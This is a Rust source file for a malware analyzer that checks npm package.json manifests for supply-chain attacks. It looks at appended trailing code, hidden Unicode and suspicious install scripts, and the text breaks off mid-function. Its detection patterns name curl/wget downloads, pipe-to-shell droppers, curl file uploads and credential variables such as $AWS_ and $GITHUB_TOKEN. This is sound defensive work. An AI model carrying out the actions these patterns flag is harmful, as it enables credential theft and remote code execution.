//! package.json analyzer for npm packages.
use crate::analyzers::unified::UnifiedSourceAnalyzer;
use crate::analyzers::{AnalysisInput, Analyzer, FileType};
use crate::capabilities::CapabilityMapper;
use crate::types::{
    AnalysisReport, Criticality, Evidence, Finding, Import, StringInfo, StringType,
    StructuralFeature, TargetInfo,
};
use anyhow::{Context, Result};
use serde::{Deserialize, Deserializer};
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use std::sync::{Arc, OnceLock};

/// npm package.json analyzer for detecting supply chain attacks
#[derive(Debug)]
pub(crate) struct PackageJsonAnalyzer {
    capability_mapper: Arc<CapabilityMapper>,
}

/// Deserialize a JSON value as `HashMap<String, String>`, returning an empty map
/// if the value is not an object (e.g. old npm packages use `"dependencies": []`).
/// Deserialize a boolean that might be encoded as a string (e.g. `"true"` instead of `true`).
fn deserialize_bool_tolerant<'de, D>(deserializer: D) -> Result<bool, D::Error>
where
    D: Deserializer<'de>,
{
    let value = serde_json::Value::deserialize(deserializer)?;
    match value {
        serde_json::Value::Bool(b) => Ok(b),
        serde_json::Value::String(s) => Ok(s.eq_ignore_ascii_case("true")),
        _ => Ok(false),
    }
}

/// Deserialize a JSON value as `Option<String>`, coercing numbers/bools to their
/// string representation. Real-world manifests occasionally have e.g. `"version": 1.0`.
fn deserialize_string_tolerant<'de, D>(deserializer: D) -> Result<Option<String>, D::Error>
where
    D: Deserializer<'de>,
{
    let value = serde_json::Value::deserialize(deserializer)?;
    match value {
        serde_json::Value::String(s) => Ok(Some(s)),
        serde_json::Value::Number(n) => Ok(Some(n.to_string())),
        serde_json::Value::Bool(b) => Ok(Some(b.to_string())),
        _ => Ok(None), // null, objects, arrays → treat as absent
    }
}

fn deserialize_map_tolerant<'de, D>(deserializer: D) -> Result<HashMap<String, String>, D::Error>
where
    D: Deserializer<'de>,
{
    let value = serde_json::Value::deserialize(deserializer)?;
    match value {
        serde_json::Value::Object(map) => {
            let mut result = HashMap::with_capacity(map.len());
            for (k, v) in map {
                // Coerce non-string values (numbers, objects) to their JSON text
                let s = match v {
                    serde_json::Value::String(s) => s,
                    other => other.to_string(),
                };
                result.insert(k, s);
            }
            Ok(result)
        }
        _ => Ok(HashMap::new()),
    }
}

#[derive(Deserialize, Default)]
struct PackageJson {
    #[serde(default, deserialize_with = "deserialize_string_tolerant")]
    name: Option<String>,
    #[serde(default, deserialize_with = "deserialize_string_tolerant")]
    version: Option<String>,
    #[serde(default, deserialize_with = "deserialize_string_tolerant")]
    publisher: Option<String>,
    #[serde(default, deserialize_with = "deserialize_bool_tolerant")]
    r#private: bool,
    #[allow(dead_code)] // Deserialized from JSON
    desc: Option<serde_json::Value>,
    #[allow(dead_code)] // Deserialized from JSON
    main: Option<serde_json::Value>,
    #[serde(default, deserialize_with = "deserialize_map_tolerant")]
    scripts: HashMap<String, String>,
    #[serde(default, deserialize_with = "deserialize_map_tolerant")]
    dependencies: HashMap<String, String>,
    #[serde(
        rename = "devDependencies",
        default,
        deserialize_with = "deserialize_map_tolerant"
    )]
    dev_dependencies: HashMap<String, String>,
    #[serde(
        rename = "peerDependencies",
        default,
        deserialize_with = "deserialize_map_tolerant"
    )]
    peer_dependencies: HashMap<String, String>,
    #[serde(
        rename = "optionalDependencies",
        default,
        deserialize_with = "deserialize_map_tolerant"
    )]
    optional_dependencies: HashMap<String, String>,
    #[allow(dead_code)] // Deserialized from JSON
    repository: Option<serde_json::Value>,
    author: Option<serde_json::Value>,
    #[allow(dead_code)] // Deserialized from JSON
    license: Option<serde_json::Value>,
    #[serde(default)]
    #[allow(dead_code)] // Deserialized from JSON
    bin: serde_json::Value,
}

/// Strip single-line `//` comments and trailing commas from JSON-like content.
/// Returns `None` if no changes were made (content was already clean).
fn sanitize_json(content: &str) -> Option<String> {
    let mut out = String::with_capacity(content.len());
    let mut changed = false;
    let mut in_string = false;
    let mut escape_next = false;
    let bytes = content.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        if escape_next {
            out.push(bytes[i] as char);
            escape_next = false;
            i += 1;
            continue;
        }

        if in_string {
            if bytes[i] == b'\\' {
                escape_next = true;
                out.push('\\');
            } else if bytes[i] == b'"' {
                in_string = false;
                out.push('"');
            } else {
                out.push(bytes[i] as char);
            }
            i += 1;
            continue;
        }

        // Outside strings
        if bytes[i] == b'"' {
            in_string = true;
            out.push('"');
            i += 1;
        } else if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'/' {
            // Line comment — skip until newline
            changed = true;
            while i < bytes.len() && bytes[i] != b'\n' {
                i += 1;
            }
        } else if bytes[i] == b','
            && bytes[i + 1..]
                .iter()
                .find(|b| !b.is_ascii_whitespace())
                .is_some_and(|&b| b == b'}' || b == b']')
        {
            // Trailing comma before } or ] — skip
            changed = true;
            i += 1;
        } else {
            out.push(bytes[i] as char);
            i += 1;
        }
    }

    if changed {
        Some(out)
    } else {
        None
    }
}

/// Best-effort extraction of package.json fields from malformed JSON using
/// regex. Returns `None` if no useful fields could be extracted.
fn extract_package_fallback(content: &str) -> Option<PackageJson> {
    fn extract_field<'a>(content: &'a str, key: &str) -> Option<&'a str> {
        let pattern = format!("\"{}\"\\s*:\\s*\"", key);
        let re = regex::Regex::new(&pattern).ok()?;
        let m = re.find(content)?;
        let rest = &content[m.end()..];
        let end = rest.find('"')?;
        Some(&rest[..end])
    }

    fn extract_map(content: &str, key: &str) -> HashMap<String, String> {
        let mut map = HashMap::new();
        // Find "key" : { ... }
        let pattern = format!("\"{}\"\\s*:\\s*\\{{", key);
        let Some(re) = regex::Regex::new(&pattern).ok() else {
            return map;
        };
        let Some(m) = re.find(content) else {
            return map;
        };
        let rest = &content[m.end()..];

        // Find matching closing brace (simple depth tracking)
        let mut depth = 1;
        let mut end = 0;
        for (i, b) in rest.bytes().enumerate() {
            match b {
                b'{' => depth += 1,
                b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        end = i;
                        break;
                    }
                }
                _ => {}
            }
        }

        if end == 0 {
            return map;
        }

        let block = &rest[..end];
        // Extract "key": "value" pairs
        let Some(kv_re) = regex::Regex::new(r#""([^"]+)"\s*:\s*"([^"]*)""#).ok() else {
            return map;
        };
        for cap in kv_re.captures_iter(block) {
            map.insert(cap[1].to_string(), cap[2].to_string());
        }
        map
    }

    let name = extract_field(content, "name").map(String::from);
    let version = extract_field(content, "version").map(String::from);
    let scripts = extract_map(content, "scripts");
    let dependencies = extract_map(content, "dependencies");
    let dev_dependencies = extract_map(content, "devDependencies");

    // Only return if we got something useful
    if name.is_none() && scripts.is_empty() && dependencies.is_empty() {
        return None;
    }

    Some(PackageJson {
        name,
        version,
        scripts,
        dependencies,
        dev_dependencies,
        ..Default::default()
    })
}

/// Check if two byte slices have edit distance exactly 1 (substitution, insertion, or deletion).
/// O(n) time, zero allocation.
fn is_edit_distance_one(a: &[u8], b: &[u8]) -> bool {
    let (shorter, longer) = if a.len() <= b.len() { (a, b) } else { (b, a) };
    let len_diff = longer.len() - shorter.len();
    if len_diff > 1 {
        return false;
    }
    if len_diff == 0 {
        // Same length: exactly one substitution
        let mut diffs = 0u32;
        for (a_byte, b_byte) in shorter.iter().zip(longer.iter()) {
            if a_byte != b_byte {
                diffs += 1;
                if diffs > 1 {
                    return false;
                }
            }
        }
        diffs == 1
    } else {
        // Length differs by 1: exactly one insertion/deletion
        let mut i = 0;
        let mut j = 0;
        let mut found_diff = false;
        while i < shorter.len() && j < longer.len() {
            if shorter[i] != longer[j] {
                if found_diff {
                    return false;
                }
                found_diff = true;
                j += 1; // skip the extra char in longer
            } else {
                i += 1;
                j += 1;
            }
        }
        true
    }
}

/// Truncate a string to at most `max_bytes` bytes at a valid UTF-8 boundary.
fn truncate_str(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    // Find the last valid char boundary at or before max_bytes
    let mut end = max_bytes;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

fn has_local_dependency_protocols(pkg: &PackageJson) -> bool {
    [
        &pkg.dependencies,
        &pkg.dev_dependencies,
        &pkg.peer_dependencies,
        &pkg.optional_dependencies,
    ]
    .into_iter()
    .flat_map(|deps| deps.values())
    .any(|value| value.starts_with("workspace:") || value.starts_with("catalog:"))
}

fn is_publish_or_install_lifecycle_script(name: &str) -> bool {
    matches!(
        name,
        "preinstall"
            | "install"
            | "postinstall"
            | "prepublish"
            | "prepare"
            | "prepack"
            | "postpack"
            | "publish"
            | "postpublish"
    )
}

fn is_local_node_script(script: &str) -> bool {
    let trimmed = script.trim();
    let Some(rest) = trimmed.strip_prefix("node ") else {
        return false;
    };
    if rest.is_empty() || rest.contains(char::is_whitespace) {
        return false;
    }
    if rest.contains(['|', '&', ';', '$', '`', '(', ')', '<', '>']) {
        return false;
    }

    matches!(
        rest,
        path if path.starts_with("scripts/")
            || path.starts_with("./scripts/")
            || path.starts_with("tools/")
            || path.starts_with("./tools/")
    )
}

fn is_local_node_eval_loader(script: &str) -> bool {
    let trimmed = script.trim();
    (trimmed.starts_with("node -e") || trimmed.starts_with("node --eval"))
        && !trimmed.contains("http://")
        && !trimmed.contains("https://")
        && !trimmed.contains("curl")
        && !trimmed.contains("wget")
        && !trimmed.contains("fetch(")
        && !trimmed.contains("fetch ")
        && !trimmed.contains("child_process")
        && !trimmed.contains("exec(")
        && !trimmed.contains("spawn(")
        && !trimmed.contains("eval(")
        && (trimmed.contains("require('./") || trimmed.contains("require(\"./"))
}

fn is_suspicious_install_hook_script(script: &str) -> bool {
    let trimmed = script.trim();
    if matches!(
        trimmed,
        "node -e 'process.exit(0)'"
            | "node -e \"process.exit(0)\""
            | "node --eval 'process.exit(0)'"
            | "node --eval \"process.exit(0)\""
    ) {
        return false;
    }

    if trimmed.contains("curl")
        || trimmed.contains("wget")
        || trimmed.contains("http://")
        || trimmed.contains("https://")
    {
        return true;
    }

    if is_local_node_script(trimmed) {
        return false;
    }

    if is_local_node_eval_loader(trimmed) {
        return false;
    }

    trimmed.contains("node -e")
        || trimmed.contains("node --eval")
        || trimmed.contains("python -c")
        || trimmed.contains("bash -c")
        || trimmed.contains("sh -c")
        || trimmed.contains("powershell -e")
}

impl PackageJsonAnalyzer {
    #[must_use]
    pub(crate) fn new() -> Self {
        Self {
            capability_mapper: Arc::new(CapabilityMapper::empty()),
        }
    }

    /// Create analyzer with pre-existing capability mapper (wraps in Arc)
    #[must_use]
    pub(crate) fn with_capability_mapper(mut self, mapper: CapabilityMapper) -> Self {
        self.capability_mapper = Arc::new(mapper);
        self
    }

    /// Create analyzer with shared capability mapper (avoids cloning)
    #[must_use]
    pub(crate) fn with_capability_mapper_arc(mut self, mapper: Arc<CapabilityMapper>) -> Self {
        self.capability_mapper = mapper;
        self
    }

    fn analyze_package(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Strip UTF-8 BOM if present — some malicious npm packages prepend a BOM
        // to evade JSON parsers that don't handle it.
        let content = content.strip_prefix('\u{FEFF}').unwrap_or(content);

        // Three-stage parse: strict serde → sanitized JSON → regex fallback.
        // Tracks which stage succeeded and the original parse error for diagnostics.
        let (pkg, json_end, malformed_reason) = self.parse_package_json(content)?;

        let trailing = if json_end < content.len() {
            content[json_end..].trim()
        } else {
            ""
        };

        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "package.json".to_string(),
            size_bytes: content.len() as u64,
            sha256: crate::analyzers::utils::calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Emit a finding if we had to recover from malformed JSON. This is itself
        // a suspicious signal — legitimate packages have valid JSON, while malware
        // often mangles JSON to evade static analysis.
        if let Some(reason) = &malformed_reason {
            report.add_finding(
                Finding::indicator(
                    "metadata/manifest/malformed-json".to_string(),
                    format!(
                        "package.json contains invalid JSON that required fallback parsing: {}",
                        reason
                    ),
                    0.85,
                )
                .with_criticality(Criticality::Suspicious)
                .with_evidence(vec![Evidence {
                    method: "parser".to_string(),
                    source: "package.json".to_string(),
                    value: truncate_str(reason, 200).to_string(),
                    location: None,
                    ..Default::default()
                }]),
            );
        }

        // Trailing non-whitespace after the JSON object is structurally invalid and
        // a known supply-chain attack vector (hidden code appended after `}`).
        if !trailing.is_empty() {
            self.analyze_trailing_content(
                file_path,
                trailing,
                json_end,
                content.len(),
                &mut report,
            );
        }

        let parser_source = if malformed_reason.is_some() {
            "fallback"
        } else {
            "serde_json"
        };

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "manifest/npm/package.json".to_string(),
            desc: format!(
                "npm package manifest: {} v{}",
                pkg.name.as_deref().unwrap_or("unknown"),
                pkg.version.as_deref().unwrap_or("unknown")
            ),
            evidence: vec![Evidence {
                method: "parser".to_string(),
                source: parser_source.to_string(),
                value: "package.json".to_string(),
                location: None,
                ..Default::default()
            }],
        });

        // Check for suspicious package metadata
        self.check_metadata(&pkg, &mut report);

        // Analyze scripts for suspicious patterns
        self.analyze_scripts(&pkg.scripts, &mut report);

        // Analyze dependencies for known malicious packages and typosquatting
        self.analyze_dependencies(&pkg, &mut report);

        // Check for install hooks that could run malicious code
        self.check_install_hooks(&pkg.scripts, &mut report);

        // Extract interesting strings from scripts
        self.extract_script_strings(&pkg.scripts, &mut report);

        // Evaluate all rules (atomic + composite) and merge into report
        // This catches patterns like curl, wget, perl execution, etc.
        self.capability_mapper.evaluate_and_merge_findings(
            &mut report,
            content.as_bytes(),
            None,
            None,
        );

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec![parser_source.to_string()];

        Ok(report)
    }

    /// Three-stage package.json parser:
    /// 1. Strict serde_json (streaming, tolerates trailing content)
    /// 2. Sanitized JSON (strip // comments and trailing commas, retry serde)
    /// 3. Regex fallback (extract key fields from hopelessly broken JSON)
    ///
    /// Returns (parsed package, byte offset of JSON end, optional malformed reason).
    fn parse_package_json(&self, content: &str) -> Result<(PackageJson, usize, Option<String>)> {
        // Stage 1: strict serde_json.
        let de = serde_json::Deserializer::from_str(content);
        let mut stream = de.into_iter::<PackageJson>();
        if let Some(Ok(pkg)) = stream.next() {
            return Ok((pkg, stream.byte_offset(), None));
        }

        // Stage 1 failed — capture the error message for diagnostics.
        let strict_err = {
            let de2 = serde_json::Deserializer::from_str(content);
            let mut s2 = de2.into_iter::<PackageJson>();
            match s2.next() {
                Some(Err(e)) => e.to_string(),
                _ => "unknown parse error".to_string(),
            }
        };

        // Stage 2: strip // comments and trailing commas, retry.
        if let Some(sanitized) = sanitize_json(content) {
            let de = serde_json::Deserializer::from_str(&sanitized);
            let mut stream = de.into_iter::<PackageJson>();
            if let Some(Ok(pkg)) = stream.next() {
                return Ok((pkg, content.len(), Some(strict_err)));
            }
        }

        // Stage 3: regex extraction from hopelessly broken JSON.
        if let Some(pkg) = extract_package_fallback(content) {
            return Ok((pkg, content.len(), Some(strict_err)));
        }

        Err(anyhow::anyhow!(
            "Failed to parse package.json: {}",
            strict_err
        ))
    }

    /// Analyze non-JSON trailing content appended after the package.json object.
    ///
    /// No legitimate package.json has content after the closing `}`. This is a known
    /// supply-chain attack vector: attackers append JavaScript (sometimes using Unicode
    /// steganography with variation selectors) that gets evaluated at install time.
    fn analyze_trailing_content(
        &self,
        file_path: &Path,
        trailing: &str,
        json_end_offset: usize,
        total_size: usize,
        report: &mut AnalysisReport,
    ) {
        let trailing_bytes = trailing.len();
        let preview = truncate_str(trailing, 200);

        // 1. Metadata finding: the JSON itself is structurally invalid (Notable).
        report.add_finding(
            Finding::indicator(
                "metadata/manifest/invalid-json".to_string(),
                format!(
                    "package.json has {} bytes of non-JSON content after closing brace at offset {}",
                    trailing_bytes, json_end_offset
                ),
                0.95,
            )
            .with_criticality(Criticality::Notable)
            .with_evidence(vec![Evidence {
                method: "parser".to_string(),
                source: "package.json".to_string(),
                value: preview.to_string(),
                location: Some(format!("offset:{json_end_offset}")),
                ..Default::default()
            }]),
        );

        // 2. Check for Unicode steganography (variation selectors, zero-width characters).
        //    These are invisible in editors and terminals — a strong obfuscation signal.
        //    Single pass over characters to detect both categories.
        let mut has_variation_selectors = false;
        let mut has_zero_width = false;
        for c in trailing.chars() {
            let cp = c as u32;
            if (0xFE00..=0xFE0F).contains(&cp) || (0xE0100..=0xE01EF).contains(&cp) {
                has_variation_selectors = true;
            } else if matches!(cp, 0x200B | 0x200C | 0x200D | 0x2060 | 0xFEFF) {
                has_zero_width = true;
            }
            if has_variation_selectors && has_zero_width {
                break;
            }
        }

        if has_variation_selectors {
            report.add_finding(
                Finding::indicator(
                    "objectives/anti-static/obfuscate/steganography/unicode-variation-selectors"
                        .to_string(),
                    "Trailing content uses Unicode variation selectors to hide data".to_string(),
                    0.95,
                )
                .with_criticality(Criticality::Suspicious)
                .with_attack("T1027".to_string())
                .with_evidence(vec![Evidence {
                    method: "pattern".to_string(),
                    source: "package.json".to_string(),
                    value: format!("{} bytes of steganographic content", trailing_bytes),
                    location: Some(format!("offset:{json_end_offset}")),
                    ..Default::default()
                }]),
            );
        }

        if has_zero_width {
            report.add_finding(
                Finding::indicator(
                    "objectives/anti-static/obfuscate/steganography/zero-width-characters"
                        .to_string(),
                    "Trailing content uses zero-width Unicode characters to hide data".to_string(),
                    0.90,
                )
                .with_criticality(Criticality::Suspicious)
                .with_attack("T1027".to_string())
                .with_evidence(vec![Evidence {
                    method: "pattern".to_string(),
                    source: "package.json".to_string(),
                    value: format!("{} bytes of steganographic content", trailing_bytes),
                    location: Some(format!("offset:{json_end_offset}")),
                    ..Default::default()
                }]),
            );
        }

        // 3. Suspicious: executable code is embedded in a manifest file.
        //    If the trailing content looks like JavaScript, flag it and also run it
        //    through the full JS analyzer as an embedded layer.
        let looks_like_code = trailing.contains("eval(")
            || trailing.contains("require(")
            || trailing.contains("function")
            || trailing.contains("const ")
            || trailing.contains("var ")
            || trailing.contains("let ")
            || trailing.contains("import ")
            || trailing.contains("=>")
            || trailing.contains("Buffer.from")
            || trailing.contains("process.")
            || trailing.contains("module.exports");

        if looks_like_code {
            report.add_finding(
                Finding::indicator(
                    "objectives/lateral-movement/supply-chain/npm/embedded-code".to_string(),
                    format!(
                        "Executable JavaScript ({} bytes, {:.0}% of file) appended after package.json",
                        trailing_bytes,
                        (trailing_bytes as f64 / total_size as f64) * 100.0
                    ),
                    0.95,
                )
                .with_criticality(Criticality::Suspicious)
                .with_attack("T1195.002".to_string())
                .with_evidence(vec![Evidence {
                    method: "pattern".to_string(),
                    source: "package.json".to_string(),
                    value: preview.to_string(),
                    location: Some(format!("offset:{json_end_offset}")),
                    ..Default::default()
                }]),
            );

            // Run the trailing content through the full JavaScript analyzer as an
            // embedded layer, giving it AST parsing, capability detection, YARA, etc.
            let virtual_path = format!("{}##trailing@{:#x}", file_path.display(), json_end_offset);
            if let Some(analyzer) = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript) {
                let js_analyzer = analyzer
                    .with_capability_mapper_arc(self.capability_mapper.clone())
                    .without_embedded_detection();
                let js_report = js_analyzer.analyze_source(Path::new(&virtual_path), trailing);
                let mut layer = js_report.to_file_analysis(0);
                layer.path = virtual_path;
                layer.depth = 1;
                layer.compute_summary();
                report.files.push(layer);
            }
        }
    }

    fn analyze_scripts(&self, scripts: &HashMap<String, String>, report: &mut AnalysisReport) {
        for (name, script) in scripts {
            // Check for base64 encoded content
            if script.contains("base64") || script.contains("atob") || script.contains("btoa") {
                report.add_finding(
                    Finding::indicator(
                        "obfuscation/encoding/base64".to_string(),
                        format!("Script '{}' uses base64 encoding", name),
                        0.7,
                    )
                    .with_criticality(Criticality::Notable)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 100).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for network operations in scripts
            if script.contains("curl ")
                || script.contains("wget ")
                || script.contains("fetch(")
                || script.contains("http://")
                || script.contains("https://")
            {
                report.add_finding(
                    Finding::capability(
                        "net/http/download".to_string(),
                        format!("Script '{}' performs network operations", name),
                        0.9,
                    )
                    .with_criticality(Criticality::Notable)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 100).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for shell command execution
            if script.contains("eval ")
                || script.contains("$(")
                || script.contains("`")
                || script.contains("sh -c")
                || script.contains("bash -c")
            {
                report.add_finding(
                    Finding::capability(
                        "execution/command/shell".to_string(),
                        format!("Script '{}' executes shell commands", name),
                        0.8,
                    )
                    .with_criticality(Criticality::Notable)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 100).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for file system operations
            if script.contains("rm -rf") || script.contains("rmdir") || script.contains("unlink") {
                report.add_finding(
                    Finding::capability(
                        "fs/file/delete".to_string(),
                        format!("Script '{}' performs file deletion", name),
                        0.8,
                    )
                    .with_criticality(Criticality::Notable)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 100).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for environment variable access (credential theft)
            if script.contains("$HOME")
                || script.contains("$USER")
                || script.contains("$AWS_")
                || script.contains("$GITHUB_TOKEN")
                || script.contains("process.env")
            {
                report.add_finding(
                    Finding::capability(
                        "discovery/env-vars".to_string(),
                        format!("Script '{}' accesses environment variables", name),
                        0.7,
                    )
                    .with_criticality(Criticality::Notable)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 100).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for data exfiltration via curl POST
            if script.contains("curl -d")
                || script.contains("curl --data")
                || script.contains("-X POST")
            {
                report.add_finding(
                    Finding::indicator(
                        "exfiltration/http-post".to_string(),
                        format!("Script '{}' sends data via HTTP POST", name),
                        0.9,
                    )
                    .with_criticality(Criticality::Suspicious)
                    .with_attack("T1041".to_string())
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 200).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for file exfiltration (curl -d "@file")
            if script.contains("curl") && script.contains("@/") {
                report.add_finding(
                    Finding::indicator(
                        "exfiltration/file-upload".to_string(),
                        format!("Script '{}' uploads local file via curl", name),
                        0.95,
                    )
                    .with_criticality(Criticality::Hostile)
                    .with_attack("T1041".to_string())
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 200).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for script interpreter execution (perl, python, ruby, etc.)
            let interpreters = [
                ("perl ", "execution/script/perl"),
                ("python ", "execution/script/python"),
                ("python3 ", "execution/script/python"),
                ("ruby ", "execution/script/ruby"),
                ("node ", "execution/script/node"),
            ];
            for (interp, finding_id) in interpreters {
                if script.contains(interp) {
                    report.add_finding(
                        Finding::capability(
                            finding_id.to_string(),
                            format!("Script '{}' executes {} interpreter", name, interp.trim()),
                            0.9,
                        )
                        .with_criticality(Criticality::Notable)
                        .with_attack("T1059".to_string())
                        .with_evidence(vec![Evidence {
                            method: "pattern".to_string(),
                            source: "package.json".to_string(),
                            value: truncate_str(script, 200).to_string(),
                            location: Some(format!("scripts.{}", name)),
                            ..Default::default()
                        }]),
                    );
                }
            }

            // Check for download-and-execute pattern
            if (script.contains("curl") || script.contains("wget"))
                && script.contains("&&")
                && (script.contains("perl ")
                    || script.contains("python")
                    || script.contains("ruby ")
                    || script.contains("node ")
                    || script.contains("sh ")
                    || script.contains("bash "))
            {
                report.add_finding(
                    Finding::indicator(
                        "command-and-control/dropper/download-execute".to_string(),
                        format!(
                            "Script '{}' downloads and executes code (dropper pattern)",
                            name
                        ),
                        0.95,
                    )
                    .with_criticality(Criticality::Hostile)
                    .with_attack("T1105".to_string())
                    .with_mbc("B0024".to_string())
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 300).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for piping to interpreter (very suspicious)
            if script.contains("| sh")
                || script.contains("| bash")
                || script.contains("| perl")
                || script.contains("| python")
            {
                report.add_finding(
                    Finding::indicator(
                        "command-and-control/dropper/pipe-execute".to_string(),
                        format!("Script '{}' pipes content to interpreter", name),
                        0.95,
                    )
                    .with_criticality(Criticality::Hostile)
                    .with_attack("T1059".to_string())
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 200).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Hidden file references are suspicious in install/publish lifecycle hooks,
            // but common in benign helper scripts such as docs/build tooling.
            if is_publish_or_install_lifecycle_script(name) && script.contains("/.") {
                // Extract the hidden file path, excluding standard paths like node_modules/.bin/
                let hidden_files: Vec<&str> = script
                    .split_whitespace()
                    .filter(|s| {
                        s.contains("/.")
                            && !s.contains("node_modules/.bin/")
                            && !s.contains("../")
                            && !s.starts_with("--") // CLI flags (e.g. --config=test/.istanbul.yml) are not hidden file access
                    })
                    .collect();
                if !hidden_files.is_empty() {
                    report.add_finding(
                        Finding::indicator(
                            "evasion/hidden-file".to_string(),
                            format!(
                                "Script '{}' references hidden file(s): {}",
                                name,
                                hidden_files.join(", ")
                            ),
                            0.85,
                        )
                        .with_criticality(Criticality::Suspicious)
                        .with_attack("T1564.001".to_string())
                        .with_evidence(vec![Evidence {
                            method: "pattern".to_string(),
                            source: "package.json".to_string(),
                            value: hidden_files.join(", "),
                            location: Some(format!("scripts.{}", name)),
                            ..Default::default()
                        }]),
                    );
                }
            }

            // Check for PHP endpoints (common C2 pattern)
            if script.contains(".php") {
                report.add_finding(
                    Finding::indicator(
                        "command-and-control/endpoint/php".to_string(),
                        format!(
                            "Script '{}' contacts PHP endpoint (common C2 pattern)",
                            name
                        ),
                        0.75,
                    )
                    .with_criticality(Criticality::Suspicious)
                    .with_attack("T1071.001".to_string())
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: truncate_str(script, 200).to_string(),
                        location: Some(format!("scripts.{}", name)),
                        ..Default::default()
                    }]),
                );
            }

            // Check for suspicious domain patterns (random-looking names)
            for url in self.extract_urls(script) {
                if self.is_suspicious_domain(&url) {
                    report.add_finding(
                        Finding::indicator(
                            "command-and-control/suspicious-domain".to_string(),
                            format!("Script '{}' contacts suspicious domain: {}", name, url),
                            0.8,
                        )
                        .with_criticality(Criticality::Suspicious)
                        .with_attack("T1071.001".to_string())
                        .with_evidence(vec![Evidence {
                            method: "heuristic".to_string(),
                            source: "package.json".to_string(),
                            value: url,
                            location: Some(format!("scripts.{}", name)),
                            ..Default::default()
                        }]),
                    );
                }
            }
        }
    }

    fn check_metadata(&self, pkg: &PackageJson, report: &mut AnalysisReport) {
        let is_official_react_native = self.is_official_react_native_package(pkg);

        // Check for empty or missing author (suspicious for published packages)
        let author_empty = match &pkg.author {
            None => true,
            Some(serde_json::Value::String(s)) => s.trim().is_empty(),
            Some(serde_json::Value::Object(obj)) => obj
                .get("name")
                .and_then(|v| v.as_str())
                .map(|s| s.trim().is_empty())
                .unwrap_or(true),
            _ => false,
        };

        if author_empty
            && !pkg.r#private
            && !has_local_dependency_protocols(pkg)
            && pkg.publisher.is_none()
            && !is_official_react_native
        {
            report.add_finding(
                Finding::indicator(
                    "supply-chain/missing-author".to_string(),
                    "Package has empty or missing author field".to_string(),
                    0.5,
                )
                .with_criticality(Criticality::Notable)
                .with_evidence(vec![Evidence {
                    method: "metadata".to_string(),
                    source: "package.json".to_string(),
                    value: "author field is empty".to_string(),
                    location: Some("author".to_string()),
                    ..Default::default()
                }]),
            );
        }

        // Check for suspicious package name patterns
        if let Some(name) = &pkg.name {
            if self.is_suspicious_package_name(name) && !is_official_react_native {
                report.add_finding(
                    Finding::indicator(
                        "supply-chain/suspicious-name".to_string(),
                        format!("Package name '{}' matches suspicious patterns", name),
                        0.7,
                    )
                    .with_criticality(Criticality::Suspicious)
                    .with_evidence(vec![Evidence {
                        method: "pattern".to_string(),
                        source: "package.json".to_string(),
                        value: name.clone(),
                        location: Some("name".to_string()),
                        ..Default::default()
                    }]),
                );
            }
        }

        // Check for version 1.0.0 with install hooks (common in malicious packages)
        if pkg.version.as_deref() == Some("1.0.0") {
            let has_install_hooks = pkg.scripts.keys().any(|k| {
                matches!(
                    k.as_str(),
                    "preinstall" | "install" | "postinstall" | "prepublish"
                )
            });
            if has_install_hooks {
                report.add_finding(
                    Finding::indicator(
                        "supply-chain/new-package-with-hooks".to_string(),
                        "Version 1.0.0 package with install hooks (common malware pattern)"
                            .to_string(),
                        0.6,
                    )
                    .with_criticality(Criticality::Notable)
                    .with_evidence(vec![Evidence {
                        method: "heuristic".to_string(),
                        source: "package.json".to_string(),
                        value: "version 1.0.0 with install hooks".to_string(),
                        location: Some("version + scripts".to_string()),
                        ..Default::default()
                    }]),
                );
            }
        }
    }

    fn analyze_dependencies(&self, pkg: &PackageJson, report: &mut AnalysisReport) {
        let is_official_react_native = self.is_official_react_native_package(pkg);
        let all_deps: Vec<(&str, &str)> = pkg
